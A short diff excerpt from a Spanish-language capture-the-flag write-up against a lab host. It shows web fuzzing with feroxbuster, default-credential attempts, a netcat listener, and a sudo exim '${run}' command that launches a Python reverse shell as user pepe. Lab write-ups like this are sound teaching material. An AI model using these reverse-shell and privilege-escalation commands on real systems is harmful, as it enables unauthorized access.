@@ -30,7 +30,7 @@ por lo visto solo contiene el puerto 80 abierto, asi que chequeo el servicio web
 
 chequeo el codigo fuente pero no consigo nada, intento con credenciales por defecto como root:root o admin:admin pero sin resultados asi que aplico fuzzing web a ver que mas puedo conseguir
 
-# FUzzing Web
+# Fuzzing Web
 
 ```
 feroxbuster -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x txt,php,bak,db,py,html,js,jpg,png,log -t 200 -d 10 --random-agent
@@ -288,6 +288,8 @@ pty.spawn("/bin/bash")
 ```
 le asigno permisos de ejecucion `chmod +x /tmp/revershell.py`, me coloco en escucha netcat en mi maquina atacante `nc -lnvp 4445` y ejecuto el script como el user
 pepe `sudo -u pepe /usr/sbin/exim -be '${run{/bin/bash -c "python3 /tmp/revershell.py"}}'`, chequeo netcaat y he recibido la conexion como el user pepe
+
+# User pepe
 
 tratando la bash
 ```
